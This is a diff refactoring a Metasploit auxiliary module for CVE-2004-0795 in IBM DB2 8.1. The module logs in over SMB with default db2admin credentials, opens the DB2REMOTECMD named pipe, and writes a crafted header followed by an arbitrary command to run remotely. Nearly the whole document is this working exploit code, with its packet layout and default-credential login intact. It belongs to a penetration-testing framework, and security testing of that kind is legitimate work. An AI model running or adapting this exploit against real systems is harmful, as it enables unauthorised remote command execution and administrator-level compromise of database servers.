@@ -7,45 +7,53 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::SMB::Client
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'IBM DB2 db2rcmd.exe Command Execution Vulnerability',
+        'Description' => %q{
           This module exploits a vulnerability in the Remote Command Server
           component in IBM's DB2 Universal Database 8.1. An authenticated
           attacker can send arbitrary commands to the DB2REMOTECMD named pipe
           which could lead to administrator privileges.
-      },
-      'Author'         => [ 'MC' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
+        },
+        'Author' => [ 'MC' ],
+        'License' => MSF_LICENSE,
+        'References' => [
           [ 'CVE', '2004-0795' ],
           [ 'OSVDB', '4180' ],
           [ 'BID', '9821' ],
         ],
-      'DisclosureDate' => '2004-03-04'))
+        'DisclosureDate' => '2004-03-04',
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'SideEffects' => [IOC_IN_LOGS],
+          'Reliability' => []
+        }
+      )
+    )
 
-      register_options(
-        [
-          OptString.new('CMD', [ true, 'The command to execute', 'ver']),
-          OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin'], fallbacks: ['USERNAME']),
-          OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'], fallbacks: ['PASSWORD']),
-        ])
+    register_options(
+      [
+        OptString.new('CMD', [ true, 'The command to execute', 'ver']),
+        OptString.new('SMBUser', [ true, 'The username to authenticate as', 'db2admin'], fallbacks: ['USERNAME']),
+        OptString.new('SMBPass', [ true, 'The password for the specified username', 'db2admin'], fallbacks: ['PASSWORD']),
+      ]
+    )
 
-      deregister_options('SMB::ProtocolVersion')
+    deregister_options('SMB::ProtocolVersion')
   end
 
   def run
-
-    print_status("Connecting to the server...")
+    print_status('Connecting to the server...')
     connect(versions: [1])
 
     print_status("Authenticating as user '#{datastore['SMBUser']}' with pass '#{datastore['SMBPass']}'...")
 
     # Connect with a valid user/pass. if not, then bail.
     begin
-      smb_login()
-    rescue ::Exception => e
+      smb_login
+    rescue StandardError => e
       print_error("Error: #{e}")
       disconnect
       return
@@ -54,12 +62,12 @@ class MetasploitModule < Msf::Auxiliary
     # Have it so our command arg is convenient to call.
     rcmd = datastore['CMD']
 
-    print_status("Connecting to named pipe \\DB2REMOTECMD...")
+    print_status('Connecting to named pipe \\DB2REMOTECMD...')
 
     # If the pipe doesn't exist, bail.
     begin
       pipe = simple.create_pipe('\\DB2REMOTECMD')
-    rescue ::Exception => e
+    rescue StandardError => e
       print_error("Error: #{e}")
       disconnect
       return
@@ -70,20 +78,19 @@ class MetasploitModule < Msf::Auxiliary
     fid = pipe.file_id
 
     # Need to make a Trans2 request with the param of 'QUERY_FILE_INFO' keeping our file_id
-    trans2 = simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')
+    simple.client.trans2(0x0007, [fid, 1005].pack('vv'), '')
 
     # Write to the pipe, our command length comes into play.
-    pipe.write([0x00000001].pack('V') + "DB2" + "\x00" * 525 + [rcmd.length].pack('V'))
+    pipe.write([0x00000001].pack('V') + 'DB2' + "\x00" * 525 + [rcmd.length].pack('V'))
     # Send off our command
     pipe.write(rcmd)
 
     # Read from the pipe and give us the data.
-    res = pipe.read()
+    res = pipe.read
     print_line(res)
 
     # Close the named pipe and disconnect from the socket.
     pipe.close
     disconnect
-
   end
 end
